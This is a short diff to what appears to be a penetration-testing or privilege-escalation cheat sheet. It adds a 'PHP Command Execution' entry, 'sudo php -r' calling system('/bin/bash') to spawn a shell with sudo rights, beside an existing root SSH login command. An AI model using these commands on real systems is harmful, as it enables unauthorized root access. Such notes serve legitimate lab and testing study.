@@ -27,3 +27,10 @@
   ```bash
   ssh -i id_rsa root@localhost -p 80
   ```
+
+### PHP Command Execution
+
+- **Execute a PHP Command**:  
+  ```bash
+  sudo php -r "system('/bin/bash');"
+  ```
